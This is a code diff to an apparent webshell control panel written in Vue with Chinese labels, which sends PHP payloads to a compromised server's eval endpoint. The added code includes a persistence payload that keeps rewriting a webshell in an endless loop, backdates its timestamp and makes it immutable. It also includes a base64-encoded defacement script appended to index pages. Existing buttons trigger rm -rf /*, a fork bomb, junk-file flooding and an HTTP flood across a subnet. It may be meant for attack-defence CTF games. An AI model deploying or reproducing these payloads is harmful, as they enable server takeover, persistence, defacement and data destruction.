@@ -19,6 +19,7 @@ const actionResult = ref("")
 
 async function postCode(code) {
   let result
+  actionResult.value = ""
   try {
     result = await postDataOrPopupError(`/session/${props.session}/php_eval`, {
       code: code.replace("{action_input_base64}", Base64.encode(actionInput.value))
@@ -42,7 +43,7 @@ async function writeBlackPage(code, html) {
 }
 
 const blackPageHtml = computed(() => {
-  const codeOrig = atob("Pz4KPHNjcmlwdD4KICBmdW5jdGlvbiBhZGROb2lzeVRleHQoKSB7CiAgICBmdW5jdGlvbiBzZXRQb3ModHJhbnNpdGlvbikgewogICAgICBwLnN0eWxlID0gYAogICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgIHotaW5kZXg6IDExNDUxNDsKICAgICAgZm9udC1zaXplOiA2MHB4OwogICAgICBmb250LWZhbWlseTogJ0NvdXJpZXIgTmV3JywgbW9ub3NwYWNlOwogICAgICBmb250LXdlaWdodDogYm9sZGVyOwogICAgICB0b3A6ICR7TWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogKHdpbmRvdy5pbm5lckhlaWdodCAtIDIwMCkgKyB3aW5kb3cucGFnZVlPZmZzZXQpfXB4OwogICAgICBsZWZ0OiAke01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqICh3aW5kb3cuaW5uZXJXaWR0aCAqIDAuNikgKyB3aW5kb3cucGFnZVhPZmZzZXQpfXB4OwogICAgICB0cmFuc2l0aW9uOiBhbGwgJHt0cmFuc2l0aW9uIHx8ICIycyJ9OwogICAgICBhbmltYXRpb246IGdsb3dpbmcgMnMgaW5maW5pdGU7CiAgICBgCiAgICB9CgogICAgZnVuY3Rpb24gcmVjU2V0UG9zKCkgewogICAgICBzZXRQb3MoKQogICAgICBzZXRUaW1lb3V0KHJlY1NldFBvcywgTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogMTAwMCArIDIwMDApKQogICAgfQoKICAgIGxldCBwID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgicCIpCiAgICBsZXQgc3R5bGUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzdHlsZSIpCiAgICBzdHlsZS50ZXh0Q29udGVudCA9IGAKICAgIEBrZXlmcmFtZXMgZ2xvd2luZyB7CiAgICAgIDAlIHt0ZXh0LXNoYWRvdzogM3B4IDNweCAycHggcmdiKDI1NSwgMCwgMCk7fQogICAgICAzMyUge3RleHQtc2hhZG93OiAzcHggM3B4IDJweCByZ2IoMCwgMjU1LCAwKTt9CiAgICAgIDY2JSB7dGV4dC1zaGFkb3c6IDNweCAzcHggMnB4IHJnYigwLCAwLCAyNTUpO30KICAgICAgMTAwJSB7dGV4dC1zaGFkb3c6IDNweCAzcHggMnB4IHJnYigyNTUsIDAsIDApO30KICAgIH0KICAgIGAKICAgIHAudGV4dENvbnRlbnQgPSAiSEFDS0VEX0JZX01FIgogICAgcC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbiAoKSB7CiAgICAgIHNldFBvcygiMHMiKQogICAgfSkKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocCkKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc3R5bGUpCiAgICByZWNTZXRQb3MoKQogIH0KICBmb3IgKGxldCBpID0gMDsgaSA8IDEwOyBpKyspIHsKICAgIHNldFRpbWVvdXQoYWRkTm9pc3lUZXh0LCBpICogNTAwKQogIH0KCjwvc2NyaXB0Pg==")
+  const codeOrig = atob("ID8+CjxzY3JpcHQ+CiAgZnVuY3Rpb24gYWRkTm9pc3lUZXh0KCkgewogICAgZnVuY3Rpb24gc2V0UG9zKHRyYW5zaXRpb24pIHsKICAgICAgcC5zdHlsZSA9IGAKICAgICAgcG9zaXRpb246IGFic29sdXRlOwogICAgICB6LWluZGV4OiAxMTQ1MTQ7CiAgICAgIGZvbnQtc2l6ZTogNjBweDsKICAgICAgZm9udC1mYW1pbHk6ICdDb3VyaWVyIE5ldycsIG1vbm9zcGFjZTsKICAgICAgZm9udC13ZWlnaHQ6IGJvbGRlcjsKICAgICAgdG9wOiAke01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqICh3aW5kb3cuaW5uZXJIZWlnaHQgLSAyMDApICsgd2luZG93LnBhZ2VZT2Zmc2V0KX1weDsKICAgICAgbGVmdDogJHtNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiAod2luZG93LmlubmVyV2lkdGggKiAwLjYpICsgd2luZG93LnBhZ2VYT2Zmc2V0KX1weDsKICAgICAgdHJhbnNpdGlvbjogYWxsICR7dHJhbnNpdGlvbiB8fCAiMnMifTsKICAgICAgYW5pbWF0aW9uOiBnbG93aW5nIDJzIGluZmluaXRlOwogICAgYAogICAgfQoKICAgIGZ1bmN0aW9uIHJlY1NldFBvcygpIHsKICAgICAgc2V0UG9zKCkKICAgICAgc2V0VGltZW91dChyZWNTZXRQb3MsIE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIDEwMDAgKyAyMDAwKSkKICAgIH0KCiAgICBsZXQgcCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInAiKQogICAgbGV0IHN0eWxlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3R5bGUiKQogICAgc3R5bGUudGV4dENvbnRlbnQgPSBgCiAgICBAa2V5ZnJhbWVzIGdsb3dpbmcgewogICAgICAwJSB7dGV4dC1zaGFkb3c6IDNweCAzcHggMnB4IHJnYigyNTUsIDAsIDApO30KICAgICAgMzMlIHt0ZXh0LXNoYWRvdzogM3B4IDNweCAycHggcmdiKDAsIDI1NSwgMCk7fQogICAgICA2NiUge3RleHQtc2hhZG93OiAzcHggM3B4IDJweCByZ2IoMCwgMCwgMjU1KTt9CiAgICAgIDEwMCUge3RleHQtc2hhZG93OiAzcHggM3B4IDJweCByZ2IoMjU1LCAwLCAwKTt9CiAgICB9CiAgICBgCiAgICBwLnRleHRDb250ZW50ID0gIkhBQ0tFRF9CWV9NRSIKICAgIHAuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24gKCkgewogICAgICBzZXRQb3MoIjBzIikKICAgIH0pCiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHApCiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHN0eWxlKQogICAgcmVjU2V0UG9zKCkKICB9CiAgZm9yIChsZXQgaSA9IDA7IGkgPCAxMDsgaSsrKSB7CiAgICBzZXRUaW1lb3V0KGFkZE5vaXN5VGV4dCwgaSAqIDUwMCkKICB9Cgo8L3NjcmlwdD4KPD9waHAg")
   return codeOrig.replace("HACKED_BY_ME", actionInput.value)
 })
 
@@ -53,6 +54,54 @@ if($name == "") {
   echo "请在输入框中输入名字";
 }else{
   echo "Hello, $name";
+}
+`
+
+// 这里可能是在eval中执行，__FILE__的值不代表文件路径
+const persistWebshell = `
+ignore_user_abort(true);
+set_time_limit(0);
+@session_write_close();
+$filepath = base64_decode('{action_input_base64}');
+
+function deleteFolder($folder) {
+  $files = glob($folder . '/*');
+  foreach ($files as $file) {
+    if (is_file($file)) {
+      unlink($file);
+    } elseif (is_dir($file)) {
+      deleteFolder($file);
+    }
+  }
+  rmdir($folder);
+}
+
+function main($filepath) {
+  $code = file_get_contents($filepath);
+  while (1) {
+    if (is_dir($filepath)) {
+      deleteFolder($filepath);
+    }
+    file_put_contents($filepath, $code);
+    if(function_exists('touch')) {
+      touch($filepath, strtotime('2023-10-01 12:00:00'));
+    }else{
+      system('touch -m -d "2023-10-01 12:00:00" ' . $filepath);
+      system('chattr +i ' . $filepath . '2>/dev/null');
+    }
+    usleep(1000);
+  }
+}
+if($filepath == "") {
+  $filepath = $_SERVER['SCRIPT_FILENAME'];
+}
+
+if(!is_writable(dirname($filepath))) {
+  echo "文件夹".dirname($filepath)."不可写！";
+}else if(!is_writable($filepath)) {
+  echo "文件".$filepath."不可写！";
+}else{
+  main($filepath);
 }
 `
 
@@ -78,7 +127,7 @@ $content = "GET / HTTP/1.1\\r
 Host: IP\\r
 \\r";
 if(!$myip) {
-  echo ("给一个C段中的IP");
+  echo ("给一个C段中本机的IP，这个IP不会被DDoS");
 }else{
   while(1) {
     for($i = 0; $i < 256; $i ++) {
@@ -102,12 +151,18 @@ if(!$myip) {
 const blackPageCode = `
 $code = base64_decode('HTML_B64');
 if(file_exists('index.html')) {
-  file_put_contents('index.html', $code, FILE_APPEND);
-  echo "写入到index.html...";
+  if(file_put_contents('index.html', $code, FILE_APPEND)){
+    echo "写入到index.html...";
+  }else{
+    echo "写入到index.html失败";
+  }
 }
 if(file_exists('index.php')) {
-  file_put_contents('index.php', $code, FILE_APPEND);
-  echo "写入到index.php...";
+  if(file_put_contents('index.php', $code, FILE_APPEND)){
+    echo "写入到index.php...";
+  }else{
+    echo "写入到index.php失败";
+  }
 }
 `
 
@@ -150,11 +205,26 @@ while (1) {
   <div class="actionmain">
     <div class="action-group">
       <p class="group-title shadow-box">
-        一键日站
+        权限维持
       </p>
       <div class="actions shadow-box">
         <button class="action" title="检查对面服务器是否健在" @click="postCode(helloWorldCode)">
           一键你好（测试用）
+        </button>
+        <button class="action" title="将当前webshell转为不死马，顺带改一下文件的时间戳，如果需要维持其他文件请输入文件路径"
+          @click="postCode(persistWebshell)">
+          不死维持当前webshell
+        </button>
+      </div>
+    </div>
+    <div class="action-group">
+      <p class="group-title shadow-box">
+        一键搅史
+      </p>
+      <div class="actions shadow-box">
+        <button class="action" title="在index.html和index.php后面加一点料。。。"
+          @click="writeBlackPage(blackPageCode, blackPageHtml)">
+          一键挂黑页
         </button>
         <button class="action" title="不断创建临时垃圾文件" @click="postCode(writeTrashCode)">
           一键写垃圾文件
@@ -164,10 +234,6 @@ while (1) {
         </button>
         <button class="action" title="运行rm -rf /*" @click="postCode(rmRfCode)">
           一键rm -rf
-        </button>
-        <button class="action" title="在index.html和index.php后面加一点料。。。"
-          @click="writeBlackPage(blackPageCode, blackPageHtml)">
-          一键挂黑页
         </button>
         <button class="action" title="调用pcntl_fork实现fork bomb" @click="postCode(phpForkBombCode)">
           一键Fork Bomb (PHP版)
@@ -183,7 +249,7 @@ while (1) {
     <div class="action-input">
       <input type="text" class="shadow-box" v-model="actionInput" placeholder="如果action需要额外的信息在这里输入">
     </div>
-    <textarea class="action-result shadow-box" v-model="actionResult">
+    <textarea class="action-result shadow-box" v-model="actionResult" readonly>
 
   </textarea>
 
@@ -203,7 +269,7 @@ while (1) {
   display: flex;
   flex-direction: column;
   margin-bottom: 30px;
-  width: 60%;
+  width: 80%;
   margin-left: 20%;
   margin-right: 20%;
 }
@@ -226,12 +292,11 @@ while (1) {
 .actions {
   background-color: var(--background-color-2);
   width: 100%;
-  min-height: 200px;
   border-radius: 20px;
   margin-top: 20px;
   flex-grow: 1;
   display: grid;
-  grid-template-columns: repeat(5, minmax(10px, 320px));
+  grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
   grid-gap: 20px;
   padding: 20px;
 }
@@ -240,7 +305,7 @@ while (1) {
   background-color: var(--background-color-3);
   color: var(--font-color-primary);
   padding: 20px;
-  height: 100px;
+  min-height: 100px;
   outline: none;
   border: none;
   border-radius: 20px;
@@ -252,7 +317,7 @@ while (1) {
 }
 
 .action-input {
-  width: 60%;
+  width: 80%;
   display: flex;
   flex-direction: column;
   align-items: center;
@@ -275,7 +340,7 @@ while (1) {
 
 
 .action-result {
-  width: 60%;
+  width: 80%;
   height: 100%;
   box-sizing: border-box;
   resize: none;
